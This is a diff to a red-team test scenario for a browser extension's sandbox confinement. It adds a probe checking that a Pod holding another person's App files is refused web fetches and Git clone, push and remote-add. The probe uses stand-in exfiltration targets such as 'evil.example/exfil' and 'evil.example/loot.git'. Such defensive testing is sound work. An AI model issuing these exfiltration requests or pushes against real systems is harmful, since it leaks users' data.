@@ -34,6 +34,9 @@ import {
 import { makeOffscreenActorChannelClient } from '../../../extension/background/offscreen-actor-channel-client.js';
 import { buildWorkerSource } from '../../../extension/engine-tabs/notebook-tab/worker-source.js';
 import { formatEvalResult } from '../../../extension/peerd-runtime/tools/defs/js-notebook.js';
+import { makeEngineRoutes } from '../../../extension/background/routes/engine.js';
+import { parseAppManifest } from '../../../extension/peerd-engine/app-manifest.js';
+import { podGitRemoteOperation } from '../../../extension/peerd-engine/pod-shell.js';
 
 // A mock worker global shaped like a real DedicatedWorkerGlobalScope: raw
 // constructors as own props, fetch/importScripts/caches on the prototype.
@@ -80,7 +83,7 @@ export const scenario: Scenario = {
   title: 'Sandbox escape (Notebook/Pod workers, App iframe, WebVM)',
   adversary: 'malicious sandboxed code',
   asset: 'the host origin, the network, and other sandbox instances',
-  claim: 'Across all three sandbox kinds, confinement holds: the Notebook realm exposes only the audited fetch bridge (raw channels throw, native fetch unrecoverable, bridge un-unseatable) and no same-origin durable store; the Cache API and IndexedDB both throw, so the sealed extension-origin worker cannot reach the `peerd` database; OPFS mutation is checked before any root handle is opened; a remote module restricts its whole run to compute only and all remote-controlled output is fenced; an App cannot break out of its iframe or observe a targeted actor job; and the WebVM HTTP bridge refuses non-http(s) schemes, scrubs CRLF header injection, drops any smuggled auth field, and confirms body-bearing verbs.',
+  claim: 'Across all three sandbox kinds, confinement holds: the Notebook realm exposes only the audited fetch bridge (raw channels throw, native fetch unrecoverable, bridge un-unseatable) and no same-origin durable store; the Cache API and IndexedDB both throw, so the sealed extension-origin worker cannot reach the `peerd` database; OPFS mutation is checked before any root handle is opened; a remote module restricts its whole run to compute only and all remote-controlled output is fenced; an App cannot break out of its iframe or observe a targeted actor job; a Pod holding files from an App another person published reaches no web or Git remote; and the WebVM HTTP bridge refuses non-http(s) schemes, scrubs CRLF header injection, drops any smuggled auth field, and confirms body-bearing verbs.',
   threatModelRef: 'INV-6',
   tier: 'unit',
   async run() {
@@ -323,6 +326,50 @@ export const scenario: Scenario = {
         : leaked('exfiltrate via a body-bearing WebVM verb without confirmation', 'body-bearing verb classification wrong'));
     }
 
+    // A Pod that received files from an App another person published is
+    // marked. Its curl and Git remotes stay refused, even with a user grant.
+    {
+      let egress = 0;
+      const unexpected = () => { throw new Error('artifact work is out of scope here'); };
+      const routes = makeEngineRoutes({
+        auditLog: { append: async () => {} },
+        podRegistry: {
+          get: async (id: string) => id === 'pod-red-team' ? {
+            id, name: 'red team',
+            outsideFiles: { publisher: 'did:key:z6MkAttacker', appId: 'app-game', appName: 'Game', markedAt: 1 },
+          } : null,
+        },
+        podTabTracker: { getTabId: () => 7 },
+        vmHttpFetch: async () => { egress += 1; return { ok: true }; },
+        repositories: {
+          coordinate: async (_ref: unknown, operation: () => Promise<unknown>) => operation(),
+          getRemote: async () => ({ url: 'https://evil.example/loot.git' }),
+          clone: async () => { egress += 1; return { remote: { url: 'x' } }; },
+          fetch: async () => { egress += 1; return { remote: { url: 'x' } }; },
+          push: async () => { egress += 1; return { ok: true }; },
+          setRemote: async () => { egress += 1; return { url: 'x' }; },
+        },
+        artifactEngine: {
+          buildAppExport: unexpected, buildNotebookExport: unexpected, buildVmRecipeExport: unexpected,
+          openEnvelope: unexpected, inspectEnvelope: unexpected, exportFilename: unexpected,
+        },
+        awaitDenylistPolicy: async () => {}, parseAppManifest, podGitRemoteOperation,
+      });
+      const sender = { tab: { id: 7 } };
+      const fetched = await routes['pod/web-fetch']({
+        podId: 'pod-red-team', jobId: 'job-red-team', url: 'https://evil.example/exfil', method: 'GET',
+      }, sender);
+      const git = await Promise.all([
+        ['clone', 'https://evil.example/loot.git'], ['fetch'], ['push', 'origin', 'main'],
+        ['remote', 'add', 'origin', 'https://evil.example/loot.git'],
+      ].map((argv) => routes['pod/git']({ podId: 'pod-red-team', argv, remoteGrant: true }, sender)));
+      const held = egress === 0 && fetched?.ok === false
+        && git.every((reply) => reply?.result?.exitCode === 126);
+      probes.push(held
+        ? blocked('reach the web or a Git remote from a Pod holding another person\'s App files', 'the outside-files mark refuses curl and every Git remote before egress')
+        : leaked('reach the web or a Git remote from a Pod holding another person\'s App files', `egress=${egress}`));
+    }
+
     const result = summarize(probes, [
       'applyRealmSeal Notebook profile (raw channels, OPFS root, extension APIs, native deletion, bridge pin)',
       'applyRealmSeal Pod profile (no ambient fetch/raw OPFS/extension API namespaces)',
@@ -333,6 +380,7 @@ export const scenario: Scenario = {
       'buildAppEgressBlockRule (tab-scoped HTTP(S)/WebSocket network floor)',
       'makeOffscreenActorChannelClient (exact-client channel transfer)',
       'normalizeRequest + needsWebWriteConfirm (WebVM bridge scheme/CRLF/auth/confirm)',
+      'makeEngineRoutes pod/web-fetch + pod/git (outside-files mark)',
     ]);
     // The pure seal runs here; the real-worker-realm proof (and the a2a run's
     // egress + delegation refusals) is exercised in the in-browser suite:
@@ -344,6 +392,7 @@ export const scenario: Scenario = {
       'tests/engine-tabs/notebook-tab/worker-caps-profile.test.ts (remote whole-run profile)',
       'tests/peerd-runtime/tools/remote-import-policy.test.ts (remote output fence)',
       'tests/peerd-engine/single-module-linker.test.ts (seal-first graph with no child loads)',
+      'tests/background/pod-app-copy.test.ts (outside-files mark set before the first copied write)',
       'extension/tests/unit/red-team/sandbox-escape.test.js (in-browser red-team framing)',
       'scripts/cdp/states.mjs actor-builds-app (live App raw-network capture)',
       'scripts/firefox/run-runtime-tests.mjs (opaque worker host, string-compilation refusal, cancellable compiler and fetch, local and remote graph parity)',
